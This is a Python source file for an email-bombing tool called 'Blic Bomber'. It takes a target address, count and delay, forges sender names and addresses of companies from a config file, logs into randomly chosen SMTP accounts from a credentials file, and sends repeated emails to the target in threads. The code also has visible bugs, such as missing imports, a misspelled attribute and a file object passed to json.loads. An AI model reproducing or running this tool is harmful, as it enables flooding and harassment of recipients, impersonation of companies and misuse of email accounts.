import shutil
import ctypes
import random
import time
import os

import fade
from rich.console import *
from colorama import *

import inquirer
from questions import questions
from proxies import proxies

import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

banner = """
██████╗ ██╗     ██╗ ██████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██║     ██║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║     ██║██║         ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║     ██║██║         ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝███████╗██║╚██████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝ ╚══════╝╚═╝ ╚═════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

           _____
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~```````````````##(_))#H\`````Y########
                          ))    \#H\       `Y###
                      }#H)"""

ioBanner = """
██╗███╗   ██╗██╗   ██╗ █████╗ ██╗     ██╗██████╗ 
██║████╗  ██║██║   ██║██╔══██╗██║     ██║██╔══██╗
██║██╔██╗ ██║██║   ██║███████║██║     ██║██║  ██║
██║██║╚██╗██║╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║
██║██║ ╚████║ ╚████╔╝ ██║  ██║███████╗██║██████╔╝
╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ 
                                                 
 ██████╗ ██████╗ ████████╗██╗ ██████╗ ███╗   ██╗ 
██╔═══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║ 
██║   ██║██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║ 
██║   ██║██╔═══╝    ██║   ██║██║   ██║██║╚██╗██║ 
╚██████╔╝██║        ██║   ██║╚██████╔╝██║ ╚████║ 
 ╚═════╝ ╚═╝        ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ 

"""

center = shutil.get_terminal_size().columns

try:
    kernel = ctypes.windll.kernel32.SetConsoleTitleW
except:
    print("ctypes.windll is not supported on linux")

r = Fore.RED
m = Fore.MAGENTA
rst = Fore.RESET

class Stats:
    sent = 0
    failed = 0

class Main:
    def __init__(self) -> None:
        self.cbanner = "\n".join(line.center(center) for line in banner.splitlines())
        self.ioCBanner = "\n".join(line.center(center) for line in ioBanner.splitlines())
        self.cool_graphics()
        self.answers = inquirer.prompt(questions)
        self.target = self.answers["target"]
        self.amount = self.answers["amount"]
        self.delay = self.answers["delay"]

    def clear(self) -> None:
        os.system("cls" if os.name == "nt" else "clear")

    def cool_graphics(self) -> None:
        self.clear()
        kernel(f"Blic Bomber   |   Sent: {Stats.sent}  Failed: {Stats.failed}   |   Proxy: {'Active' if proxies() else 'None'}   |   Python Version: {platform.python_version()}")
        print(fade.purplepink(self.cBanner))

    def bomb(self) -> None:
        try:
            with open('transcripts/config.json', 'r') as f:
                config_data = json.load(f)

            from_list = config_data.get('From', {})
            subject_list = config_data.get('Subject', {})
            body_list = config_data.get('Bodies', {})

            msg = MIMEMultipart("related")

            random_company = random.choice(list(from_list.keys()))
            company_info = from_list.get(random_company, {})

            spoofed_name = company_info.get('Name', '')
            spoofed_email = company_info.get('Email', '')

            random_subject = random.choice(list(subject_list.values()))
            random_body = random.choice(list(body_list.values()))

            msg['From'] = f"{spoofed_name} <{spoofed_email}>"
            msg['To'] = self.target
            msg['Subject'] = random_subject
            msg.attach(MIMEText(random_body, 'plain'))

            with open("transcripts/smtps.json", "r") as f:
                smtp_data = json.loads(f)

            service_name = random.choice(list(smtp_data.keys()))
            service_data = smtp_data[service_name]

            smtp_host = service_data["smtp_server"]
            smtp_port = service_data["smtp_port"]

            user_id = random.choice([key for key in service_data["registered_users"] if key.isdigit()])
            user_data = service_data["registered_users"][user_id]

            smtp_username = user_data['user']
            smtp_password = user_data['password']

            server = smtplib.SMTP(smtp_host, smtp_port)
            server.starttls()
            server.login(smtp_username, smtp_password)
            text = msg.as_string()
            server.sendmail(from_addr=spoofed_email, to_addrs=Main.target, msg=text)
            server.quit()

        except Exception as e:
            print(f"Error: {e}")
    def start(self) -> None:
        for _ in range(int(self.amount)):
            try:
                threading.Thread(target=self.bomb).start()
            except:
                Stats.failed += 1

            time.sleep(int(self.delay))
            Stats.sent += 1  